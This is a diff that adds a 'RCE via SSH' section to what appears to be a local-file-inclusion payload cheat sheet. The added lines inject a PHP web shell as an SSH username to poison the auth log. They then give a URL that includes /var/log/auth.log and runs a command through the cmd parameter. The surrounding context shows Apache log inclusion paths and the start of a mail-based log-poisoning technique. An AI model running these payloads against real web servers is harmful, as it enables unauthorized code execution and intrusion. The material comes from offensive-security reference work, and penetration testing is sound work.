@@ -291,6 +291,20 @@ http://example.com/index.php?page=/usr/local/apache/log/error_log
 http://example.com/index.php?page=/usr/local/apache2/log/error_log
 ```
 
+### RCE via SSH
+
+Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.
+
+```powershell
+ssh <?php system($_GET["cmd"]);?>@10.10.10.10
+```
+
+Then include the SSH log files inside the Web Application.
+
+```powershell
+http://example.com/index.php?page=/var/log/auth.log&cmd=id
+```
+
 ### RCE via Mail
 
 First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.
